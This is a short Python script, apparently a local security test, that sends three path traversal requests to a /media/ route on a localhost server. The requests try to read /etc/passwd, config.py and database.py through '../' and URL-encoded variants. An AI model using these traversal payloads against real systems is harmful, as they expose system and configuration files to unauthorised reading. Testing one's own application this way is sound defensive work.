import requests

BASE_URL = "http://localhost:25086"

tests = [
    ("Path traversal via ../../../etc/passwd (on /media/)", "/media/../../../etc/passwd"),
    ("Path traversal via %2e%2e (on /media/)", "/media/%2e%2e/config.py"),
    ("Path traversal via ..%2F (on /media/)", "/media/..%2Fdatabase.py"),
]

for name, path in tests:
    print(f"=== {name} ===")
    url = f"{BASE_URL}{path}"
    print(f"URL: {url}")
    try:
        r = requests.get(url, timeout=5)
        print(f"Status: {r.status_code}")
        print(f"Body (first 200 chars): {r.text[:200]!r}")
    except Exception as e:
        print(f"Error: {e}")
    print("\n")
